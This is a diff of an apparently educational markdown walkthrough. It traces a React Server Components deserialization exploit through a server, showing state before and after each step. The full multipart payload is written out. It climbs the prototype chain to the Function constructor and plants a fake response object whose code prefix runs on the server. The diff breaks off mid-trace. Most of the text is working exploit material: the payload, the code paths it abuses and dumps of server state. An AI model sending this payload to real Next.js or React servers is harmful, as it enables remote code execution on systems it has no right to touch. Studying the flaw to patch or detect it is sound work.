@@ -4,52 +4,26 @@ A step-by-step trace showing exactly how the exploit payload transforms as it fl
 
 ---
 
-## The Exploit Payload
+## The Exploit Payload (Sent as Form Fields)
 
 ```javascript
-{
-    "0": "$1",
-    "1": {
-        "status": "resolved_model",
-        "reason": 0,
-        "_response": "$4",
-        "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
-        "then": "$2:then"
-    },
-    "2": "$@3",
-    "3": [],
-    "4": {
-        "_prefix": "console.log(7*7+1)//",
-        "_formData": {
-            "get": "$3:constructor:constructor"
-        },
-        "_chunks": "$2:_response:_chunks"
-    }
-}
+"0" = "$1"
+"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}'
+"2" = "$@3"
+"3" = "[]"
+"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}'
 ```
 
 ---
 
 ## Step 1: Request Arrives
 
-### BEFORE (Initial State)
+### BEFORE
 
 ```javascript
-// Server state
+// Server state - empty
 response._chunks = {}
 boundActionArguments = undefined
-
-// Incoming HTTP request
-POST /server-action
-Content-Type: multipart/form-data
-Next-Action: <valid-action-id>
-
-// Form fields (raw strings)
-"0" = "$1"
-"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{...}","then":"$2:then"}'
-"2" = "$@3"
-"3" = "[]"
-"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
 ```
 
 ### CODE
@@ -61,26 +35,53 @@ boundActionArguments = await decodeReplyFromBusboy(
     serverModuleMap,
     { temporaryReferences }
 )
+
+// Inside decodeReplyFromBusboy, for each form field:
+// resolveField(response, name, value) is called
 ```
 
 ### Explanation
 
-The HTTP request arrives with 5 form fields. `decodeReplyFromBusboy` parses each field and stores them as "chunks" in an internal response object. Each chunk starts as a raw string that will be resolved later.
+The HTTP request arrives with 5 form fields. Each field is stored as a Chunk in the response object. At this point, all values are still raw strings.
 
 ### AFTER
 
 ```javascript
-// Server state after parsing
 response._chunks = {
-    0: Chunk { status: "resolved_model", value: "$1", _response: response },
-    1: Chunk { status: "resolved_model", value: '{"status":"resolved_model",...}', _response: response },
-    2: Chunk { status: "resolved_model", value: "$@3", _response: response },
-    3: Chunk { status: "resolved_model", value: "[]", _response: response },
-    4: Chunk { status: "resolved_model", value: '{"_prefix":...}', _response: response }
+    0: {
+        status: "resolved_model",
+        value: "$1",
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "resolved_model",
+        value: "[]",
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,
+        _response: response
+    }
 }
 
-// The function returns chunk 0
-boundActionArguments = getChunk(response, 0)  // Returns chunk 0, which contains "$1"
+// decodeReplyFromBusboy returns chunk 0
+boundActionArguments = response._chunks[0]
 ```
 
 ---
@@ -90,14 +91,38 @@ boundActionArguments = getChunk(response, 0)  // Returns chunk 0, which contains
 ### BEFORE
 
 ```javascript
-// Current resolution target
-chunk0.value = "$1"   // <-- This needs to be resolved
-
-// Other chunks (still raw strings)
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"
-chunk3.value = "[]"
-chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
+response._chunks = {
+    0: {
+        status: "resolved_model",
+        value: "$1",                    // <-- Currently resolving this
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "resolved_model",
+        value: "[]",
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,
+        _response: response
+    }
+}
 ```
 
 ### CODE
@@ -105,14 +130,18 @@ chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constru
 ```javascript
 // ReactFlightReplyServer.js - parseModelString
 function parseModelString(response, parentObject, key, value) {
+    // value = "$1"
+
     if (value[0] !== '$') return value;
 
+    // value[0] = '$', so it's a reference
+    // value[1] = '1', which is not a special character
+
     switch (value[1]) {
-        // ... other cases ...
         default: {
-            // "$1" → parse "1" as hex → get chunk 1
+            // Parse "1" as hexadecimal chunk ID
             const refId = parseInt(value.slice(1), 16);  // refId = 1
-            return getOrResolveChunk(response, refId);
+            return getOrResolveChunk(response, refId);   // Returns chunk 1
         }
     }
 }
@@ -120,78 +149,181 @@ function parseModelString(response, parentObject, key, value) {
 
 ### Explanation
 
-The value `"$1"` starts with `$`, so it's a reference. The character after `$` is `1`, which is parsed as a hexadecimal chunk ID. The function returns chunk 1, which now needs to be resolved.
+The value `"$1"` is a chunk reference. The `$` indicates it's a reference, and `1` is the chunk ID (in hex). The function returns chunk 1, which will need to be resolved next.
 
 ### AFTER
 
 ```javascript
-// Chunk 0 now points to chunk 1
-chunk0.value = chunk1  // <-- Now references chunk 1 object
-
-// Chunk 1 needs resolution next
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'  // <-- Needs parsing
-chunk2.value = "$@3"
-chunk3.value = "[]"
-chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],     // <-- Now points to chunk 1 object
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "resolved_model",
+        value: "[]",
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,
+        _response: response
+    }
+}
 ```
 
 ---
 
-## Step 3: Chunk 3 Resolves → Empty Array (Gadget Foundation)
+## Step 3: Chunk 3 Resolves → Empty Array
 
 ### BEFORE
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"
-chunk3.value = "[]"   // <-- This gets resolved
-chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "resolved_model",
+        value: "[]",                    // <-- Currently resolving this
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,
+        _response: response
+    }
+}
 ```
 
 ### CODE
 
 ```javascript
-// JSON.parse in resolveField
-const parsed = JSON.parse("[]");  // Returns empty array: []
-chunk3.value = parsed;
+// The value "[]" is valid JSON, so it gets parsed
+const parsed = JSON.parse("[]");  // Returns: []
+
+// Chunk 3 is updated
+chunk3.value = [];
 chunk3.status = "initialized";
 ```
 
 ### Explanation
 
-The string `"[]"` is valid JSON. It parses to an empty JavaScript array. This array is critical because it provides access to the prototype chain: `[].constructor` is `Array`, and `Array.constructor` is `Function`.
+The string `"[]"` is valid JSON representing an empty array. After parsing, chunk 3 holds an actual JavaScript array. This array is critical because it provides access to the prototype chain.
 
 ### AFTER
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"
-chunk3.value = []     // <-- Now an actual empty array!
-chunk3.status = "initialized"
-chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",          // <-- Changed from "resolved_model"
+        value: [],                      // <-- Now an actual empty array!
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,
+        _response: response
+    }
+}
 
 // The prototype chain is now accessible:
-// [].constructor           → Array
-// [].constructor.constructor → Function  ← THIS IS THE RCE GADGET
+// [].constructor === Array
+// [].constructor.constructor === Function
 ```
 
 ---
 
-## Step 4: Resolving `$3:constructor:constructor` → Gets Function Constructor
+## Step 4: Resolving `$3:constructor:constructor` → Gets Function
 
 ### BEFORE
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"
-chunk3.value = []
-chunk3.status = "initialized"
-chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
-                                                                    ↑
-                                            // This reference needs resolution
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "resolved_model",
+        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
+        reason: null,                   // Resolving the "get" property ^^^
+        _response: response
+    }
+}
 ```
 
 ### CODE
@@ -199,65 +331,123 @@ chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constru
 ```javascript
 // ReactFlightReplyServer.js:595 - getOutlinedModel (VULNERABLE!)
 function getOutlinedModel(response, reference, parentObject, key, map) {
+    // reference = "3:constructor:constructor"
+
     const path = reference.split(':');
     // path = ["3", "constructor", "constructor"]
 
     const id = parseInt(path[0], 16);  // id = 3
     const chunk = getChunk(response, id);
 
-    // ... status checks ...
-
     let value = chunk.value;  // value = []
 
     // VULNERABILITY: No validation on property names!
-    // This allows traversing the prototype chain
     for (let i = 1; i < path.length; i++) {
         value = value[path[i]];
     }
-    // Loop iteration 1: value = []["constructor"]     → Array
-    // Loop iteration 2: value = Array["constructor"]  → Function
+    // Iteration 1: value = []["constructor"] = Array
+    // Iteration 2: value = Array["constructor"] = Function
 
-    return map(response, value);  // Returns Function constructor!
+    return map(response, value);  // Returns Function!
 }
 ```
 
 ### Explanation
 
-The reference `"$3:constructor:constructor"` is split by `:` into a path. Starting from chunk 3 (the empty array), the code traverses each property. There's no validation, so it happily walks up the prototype chain to reach `Function` - the constructor that can create functions from strings.
+The reference `"$3:constructor:constructor"` means: get chunk 3, then access `.constructor`, then access `.constructor` again. Since chunk 3 is an empty array:
+- `[].constructor` is `Array`
+- `Array.constructor` is `Function`
+
+The code has no validation, so it happily traverses the prototype chain.
 
 ### AFTER
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"
-chunk3.value = []
-chunk3.status = "initialized"
-chunk4.value = {
-    "_prefix": "console.log(7*7+1)//",
-    "_formData": {
-        "get": Function  // <-- NOW POINTS TO THE FUNCTION CONSTRUCTOR!
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
     },
-    "_chunks": "$2:_response:_chunks"
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",          // <-- Changed from "resolved_model"
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function           // <-- THE FUNCTION CONSTRUCTOR!
+            },
+            _chunks: "$2:_response:_chunks"  // Still needs resolution
+        },
+        reason: null,
+        _response: response
+    }
 }
-
-// chunk4._formData.get is now the Function constructor
-// Function("code") creates a new function from a string - like eval()!
 ```
 
 ---
 
-## Step 5: Chunk 2 Resolves → Raw Chunk Reference via `$@`
+## Step 5: Chunk 2 Resolves → Raw Chunk Reference
 
 ### BEFORE
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = "$@3"  // <-- This needs resolution
-chunk3.value = []
-chunk3.status = "initialized"
-chunk4._formData.get = Function
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "resolved_model",
+        value: "$@3",                   // <-- Currently resolving this
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
+}
 ```
 
 ### CODE
@@ -265,12 +455,14 @@ chunk4._formData.get = Function
 ```javascript
 // ReactFlightReplyServer.js - parseModelString
 function parseModelString(response, parentObject, key, value) {
+    // value = "$@3"
+
     switch (value[1]) {
         case '@': {
-            // "$@3" → raw chunk reference (not the resolved value!)
+            // "$@" means raw chunk reference (not resolved value)
             const id = parseInt(value.slice(2), 16);  // id = 3
             const chunk = getChunk(response, id);
-            return chunk;  // Returns the Chunk OBJECT, not chunk.value!
+            return chunk;  // Returns the Chunk OBJECT itself, not chunk.value!
         }
     }
 }
@@ -278,22 +470,56 @@ function parseModelString(response, parentObject, key, value) {
 
 ### Explanation
 
-The `$@` prefix is special - it returns the chunk object itself, not its resolved value. Normal `$3` would return `[]` (the resolved value), but `$@3` returns the Chunk wrapper object. This Chunk object has a `then` method (from `Chunk.prototype`), which is key for the next step.
+The `$@` prefix is special. Unlike `$3` which would return the resolved value (`[]`), `$@3` returns the Chunk object itself. This is important because the Chunk object has a `then` method from `Chunk.prototype`.
 
 ### AFTER
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-chunk2.value = Chunk {        // <-- Now holds the Chunk OBJECT for chunk 3
-    value: [],
-    status: "initialized",
-    _response: response,
-    then: Chunk.prototype.then  // <-- This is a function!
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "initialized",          // <-- Changed from "resolved_model"
+        value: {                        // <-- Now holds the Chunk OBJECT for chunk 3
+            status: "initialized",
+            value: [],
+            reason: null,
+            _response: response,
+            // Inherited from Chunk.prototype:
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
 }
-chunk3.value = []
-chunk3.status = "initialized"
-chunk4._formData.get = Function
 ```
 
 ---
@@ -303,13 +529,50 @@ chunk4._formData.get = Function
 ### BEFORE
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
-                                                                              ↑
-                                                        // This needs resolution
-chunk2.value = Chunk { value: [], status: "initialized", then: Chunk.prototype.then }
-chunk3.value = []
-chunk4._formData.get = Function
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "resolved_model",
+        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
+        reason: null,                   // Resolving the "then" property ^^^
+        _response: response
+    },
+    2: {
+        status: "initialized",
+        value: {
+            status: "initialized",
+            value: [],
+            reason: null,
+            _response: response,
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
+}
 ```
 
 ### CODE
@@ -320,91 +583,210 @@ const path = reference.split(':');
 // path = ["2", "then"]
 
 const id = parseInt(path[0], 16);  // id = 2
-const chunk = getChunk(response, id);  // Returns chunk2 (which is the Chunk object from $@3)
+const chunk = getChunk(response, id);
 
-let value = chunk.value;  // value = Chunk { ..., then: Chunk.prototype.then }
+let value = chunk.value;
+// value = { status: "initialized", value: [], ..., then: Chunk.prototype.then }
 
 for (let i = 1; i < path.length; i++) {
     value = value[path[i]];
 }
-// Loop iteration 1: value = chunk2.value["then"] → Chunk.prototype.then
+// Iteration 1: value = chunk2.value["then"] = Chunk.prototype.then
 
-return value;  // Returns Chunk.prototype.then function!
+return value;  // Returns Chunk.prototype.then!
 ```
 
 ### Explanation
 
-We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chunk object (from the `$@3` reference), accessing `.then` gives us `Chunk.prototype.then` - the actual Promise-like resolution method.
+We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chunk object (from `$@3`), and Chunk objects have a `then` method from their prototype, this returns `Chunk.prototype.then`.
 
 ### AFTER
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = {
-    "status": "resolved_model",
-    "reason": 0,
-    "_response": "$4",           // Still needs resolution
-    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
-    "then": Chunk.prototype.then  // <-- NOW A FUNCTION!
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "initialized",          // <-- Changed from "resolved_model"
+        value: {                        // <-- Now a parsed object
+            status: "resolved_model",
+            reason: 0,
+            _response: "$4",            // Still needs resolution
+            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- GOT IT!
+        },
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "initialized",
+        value: {
+            status: "initialized",
+            value: [],
+            reason: null,
+            _response: response,
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
 }
-chunk2.value = Chunk { value: [], then: Chunk.prototype.then }
-chunk3.value = []
-chunk4._formData.get = Function
 ```
 
 ---
 
-## Step 7: Chunk 1 Fully Resolved → Now a Thenable Object
+## Step 7: Resolving `$4` → Gets Fake Response
 
 ### BEFORE
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = {
-    "status": "resolved_model",
-    "reason": 0,
-    "_response": "$4",           // <-- Needs resolution
-    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
-    "then": Chunk.prototype.then
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
+    },
+    1: {
+        status: "initialized",
+        value: {
+            status: "resolved_model",
+            reason: 0,
+            _response: "$4",            // <-- Currently resolving this
+            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "initialized",
+        value: {
+            status: "initialized",
+            value: [],
+            reason: null,
+            _response: response,
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
 }
-chunk2.value = Chunk { ... }
-chunk3.value = []
-chunk4 = { "_prefix": "console.log(7*7+1)//", "_formData": { "get": Function }, ... }
 ```
 
 ### CODE
 
 ```javascript
-// "$4" resolves to chunk 4
+// parseModelString processes "$4"
 const refId = parseInt("4", 16);  // refId = 4
-return getOrResolveChunk(response, refId);  // Returns chunk 4 object
+return getOrResolveChunk(response, refId);  // Returns chunk 4's value
 ```
 
 ### Explanation
 
-The `_response` property resolves to chunk 4 - our fake Response object that contains the malicious code prefix and the Function constructor. Chunk 1 is now fully resolved and has a `then` property that is a function, making it a "thenable" object.
+The `_response` property resolves to chunk 4's value - the attacker's fake Response object containing the malicious code prefix and the Function constructor.
 
 ### AFTER
 
 ```javascript
-chunk0.value = chunk1
-chunk1.value = {
-    "status": "resolved_model",
-    "reason": 0,
-    "_response": {                              // <-- Resolved to chunk 4!
-        "_prefix": "console.log(7*7+1)//",
-        "_formData": { "get": Function },
-        "_chunks": ...
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1],
+        reason: null,
+        _response: response
     },
-    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
-    "then": Chunk.prototype.then                // <-- This makes it a THENABLE
+    1: {
+        status: "initialized",
+        value: {
+            status: "resolved_model",
+            reason: 0,
+            _response: {                // <-- Resolved to chunk 4's value!
+                _prefix: "console.log(7*7+1)//",
+                _formData: {
+                    get: Function
+                },
+                _chunks: "$2:_response:_chunks"
+            },
+            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "initialized",
+        value: {
+            status: "initialized",
+            value: [],
+            reason: null,
+            _response: response,
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: "$2:_response:_chunks"
+        },
+        reason: null,
+        _response: response
+    }
 }
-chunk2.value = Chunk { ... }
-chunk3.value = []
-chunk4._formData.get = Function
 
-// CRITICAL: chunk1 now has a "then" property that is a function
-// JavaScript will treat it as a Promise-like object!
+// Chunk 1's value is now complete and is a THENABLE (has "then" function)
 ```
 
 ---
@@ -414,38 +796,41 @@ chunk4._formData.get = Function
 ### BEFORE
 
 ```javascript
-// The server code awaits the result
-await boundActionArguments  // boundActionArguments points to chunk1
+// The server awaits the result
+await boundActionArguments
 
-// chunk1 state:
-{
-    status: "resolved_model",          // <-- This triggers initializeModelChunk
-    reason: 0,
-    _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
-    value: "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
-    then: Chunk.prototype.then         // <-- JavaScript sees this and calls it
-}
+// boundActionArguments = chunk 0
+// chunk 0's value = chunk 1's value
+// chunk 1's value = {
+//     status: "resolved_model",
+//     reason: 0,
+//     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function }, _chunks: ... },
+//     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+//     then: Chunk.prototype.then   <-- HAS A "then" FUNCTION!
+// }
 ```
 
 ### CODE
 
 ```javascript
-// JavaScript Promise resolution detects "then" property
-// It calls: chunk1.then(resolve, reject)
+// JavaScript sees an object with a "then" function
+// It treats it as a thenable and calls:
+chunk1Value.then(resolve, reject)
 
-// Chunk.prototype.then (ReactFlightReplyServer.js:125)
+// This invokes Chunk.prototype.then with "this" = chunk1Value
 Chunk.prototype.then = function(resolve, reject) {
-    const chunk = this;  // chunk = chunk1 (attacker's object!)
+    const chunk = this;
+    // chunk = {
+    //     status: "resolved_model",
+    //     reason: 0,
+    //     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
+    //     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+    //     then: Chunk.prototype.then
+    // }
 
     switch (chunk.status) {
-        case "resolved_model":           // chunk1.status matches!
-            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER DATA
-            break;
-    }
-
-    switch (chunk.status) {
-        case "initialized":
-            resolve(chunk.value);  // Resolves with the initialized value
+        case "resolved_model":           // This matches!
+            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER'S OBJECT
             break;
     }
 };
@@ -453,23 +838,26 @@ Chunk.prototype.then = function(resolve, reject) {
 
 ### Explanation
 
-When JavaScript `await`s an object with a `then` function, it treats it as a Promise and calls `obj.then(resolve, reject)`. Since `chunk1.then` is `Chunk.prototype.then`, and `chunk1.status` is `"resolved_model"`, it calls `initializeModelChunk(chunk1)` - using the attacker-controlled `chunk1._response`!
+When JavaScript `await`s an object with a `then` method, it calls that method. Here, `then` is `Chunk.prototype.then`. Because the attacker set `status: "resolved_model"`, it triggers `initializeModelChunk` - but with the attacker's fake `_response`!
 
 ### AFTER
 
 ```javascript
-// initializeModelChunk will be called with:
+// initializeModelChunk is called with:
 chunk = {
     status: "resolved_model",
-    _response: {                              // ATTACKER CONTROLLED!
+    reason: 0,
+    _response: {
         _prefix: "console.log(7*7+1)//",
-        _formData: { get: Function }
+        _formData: {
+            get: Function
+        },
+        _chunks: "$2:_response:_chunks"
     },
-    value: "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}"  // ATTACKER CONTROLLED!
+    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
 }
 
-// The _response will be used during value resolution
-// The value will be JSON.parsed and its references resolved
+// This will parse chunk.value as JSON and resolve references using chunk._response (FAKE!)
 ```
 
 ---
@@ -479,11 +867,18 @@ chunk = {
 ### BEFORE
 
 ```javascript
-// Inside initializeModelChunk, about to parse:
-chunk.value = "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}"
-chunk._response = {
-    _prefix: "console.log(7*7+1)//",
-    _formData: { get: Function }
+// Inside initializeModelChunk:
+chunk = {
+    status: "resolved_model",
+    reason: 0,
+    _response: {
+        _prefix: "console.log(7*7+1)//",
+        _formData: {
+            get: Function
+        },
+        _chunks: "$2:_response:_chunks"
+    },
+    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
 }
 ```
 
@@ -493,13 +888,17 @@ chunk._response = {
